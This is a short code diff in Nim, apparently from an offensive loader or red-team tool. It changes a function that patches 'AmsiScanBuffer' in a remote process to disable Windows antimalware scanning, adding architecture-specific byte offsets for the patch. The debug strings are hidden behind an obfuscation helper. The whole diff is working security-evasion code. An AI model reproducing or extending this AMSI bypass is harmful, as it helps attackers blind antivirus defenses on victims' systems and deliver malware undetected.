@@ -241,7 +241,10 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         when defined(verbose):
             echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
-    RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+    when defined amd64:
+        RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+    else:
+        RemoteProc = RemoteProc + 0x75
     var oldProtection: DWORD = 0
     var success: BOOL
     var protectAddress = RemoteProc
